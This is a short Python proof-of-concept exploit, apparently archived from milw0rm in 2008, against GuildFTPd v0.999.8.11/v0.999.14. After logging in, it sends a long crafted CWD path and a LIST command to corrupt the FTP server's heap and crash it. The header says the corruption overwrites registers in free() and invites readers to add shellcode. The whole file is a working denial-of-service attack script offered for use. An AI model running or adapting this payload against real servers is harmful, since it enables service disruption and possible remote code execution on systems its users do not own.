# GuildFTPd v0.999.8.11/v0.999.14 heap corruption PoC/DoS exploit
# GuildFTPd URL - http://www.guildftpd.com
# cwd/list heap corruption
# overwrite registers in free(): ecx, edi
#
# (x)dmnt 2008
# feel free to do shellcode
# -*- coding: windows-1252 -*-

import socket
import sys, time

evil_cwd = "/."*124
evil_dir = "X"*100

def help_info():
    print ("Usage: guildd0s <host> <login> <password>\n")
    print ("Note: anonymous is enought\n")

def dos_it(hostname, username, passwd):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    r=sock.recv(1024)
    print "[+] " + r
    sock.send("user %s\n" %username)
    r=sock.recv(1024)
    sock.send("pass %s\n" %passwd)
    r=sock.recv(1024)
    print "[+] Send evil string"
    sock.send("cwd %s\n" %evil_cwd)
    r=sock.recv(1024)
    sock.send("list %s\r\n" %evil_dir)
    time.sleep(3)
    sock.close()
    print "[!] Now server d0s'ed/heap corrupted"

print ("\n]GuildFTPd v0.999.8.11/v0.999.14 remote heap corruption PoC/DoS exploit[")
print ("](x)dmnt 2008[\n\n")

if len(sys.argv) <> 4:
    help_info()
    sys.exit(1)

else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    dos_it(hostname,username,passwd)
    sys.exit(0)

# milw0rm.com [2008-10-12]
